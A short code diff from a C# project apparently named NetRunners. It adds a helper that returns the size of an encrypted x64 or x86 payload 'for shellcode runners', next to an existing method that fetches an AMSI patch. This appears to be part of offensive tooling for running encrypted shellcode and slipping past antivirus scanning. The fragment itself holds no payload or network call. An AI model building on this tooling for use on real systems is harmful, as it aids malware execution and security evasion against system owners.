@@ -15,6 +15,15 @@ namespace NetRunners.Helpers
 
             return buf;
         }
+        public static int GetSize()  // for shellcode runners
+        {
+            // define buf var using bitness
+            int sBuf = (IntPtr.Size == 8)
+                ? Data.EncryptedData.sBuf                                // x64 payload
+                : Data.EncryptedData.sBuf86;                             // x86 payload
+
+            return sBuf;
+        }
         public static byte[] GetAmsiPatch()
         {
             byte[] patch;
